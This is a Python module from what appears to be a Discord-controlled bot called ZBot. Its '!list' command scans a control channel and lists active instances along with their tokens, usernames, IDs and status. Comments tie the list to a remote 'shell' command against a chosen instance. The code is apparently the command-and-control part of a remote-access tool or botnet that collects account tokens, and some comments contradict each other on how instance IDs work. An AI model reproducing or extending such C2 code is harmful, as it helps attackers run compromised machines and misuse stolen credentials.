"""
list_instances.py - !list
Scans the control channel and lists all active ZBot instances.
"""
import discord

OWNER_ID = 981259484691325018
CONTROL_CHANNEL_ID = 0  # Must match the one in main.py

async def run(client, message, args):
    if message.author.id != OWNER_ID:
        await message.channel.send("Unauthorized.", delete_after=5)
        return
    if not CONTROL_CHANNEL_ID:
        await message.channel.send("Control channel not set.")
        return
    channel = client.get_channel(CONTROL_CHANNEL_ID)
    if not channel:
        await message.channel.send("Control channel not found.")
        return
    # Get recent messages
    msgs = []
    async for msg in channel.history(limit=200):
        msgs.append(msg)
    # Parse each message for instance info
    instances = {}
    for msg in msgs:
        content = msg.content
        if "ZBot" not in content:
            continue
        # Extract ID (first 8 chars after "ID: `")
        try:
            id_start = content.find("ID: `") + 5
            id_end = content.find("`", id_start)
            instance_short = content[id_start:id_end]
        except:
            continue
        # Determine status (🟢 or 🔴)
        status = "ON" if "🟢" in content else "OFF"
        # Extract user
        user_start = content.find("User: `") + 7
        user_end = content.find("`", user_start)
        username = content[user_start:user_end] if user_start != -1 else "?"
        # Token
        tok_start = content.find("Token: `") + 8
        tok_end = content.find("`", tok_start)
        token = content[tok_start:tok_end] if tok_start != -1 else "N/A"
        # Keep the most recent message per instance (based on msg.id)
        key = instance_short
        if key not in instances or msg.id > instances[key]["msg_id"]:
            instances[key] = {
                "instance_short": instance_short,
                "username": username,
                "token": token,
                "status": status,
                "msg_id": msg.id
            }
    if not instances:
        await message.channel.send("No active instances found.")
        return
    # Build numbered list
    lines = []
    client._instance_map = {}
    idx = 1
    for short, data in instances.items():
        client._instance_map[idx] = short  # we store short ID, but we need full ID for shell
        # Actually we need full instance_id; we can't get it from short. We'll store short for mapping.
        # But for shell we need exact match; we'll pass the short ID and target instance compares it.
        lines.append(
            f"{idx} | ZBot | Token: `{data['token']}` | "
            f"User: `{data['username']}` | "
            f"ID: `{short}` | Status: **{data['status']}**"
        )
        idx += 1
    content = "\n".join(lines)
    if len(content) > 1900:
        content = content[:1900] + "..."
    await message.channel.send(f"```\n{content}\n```")
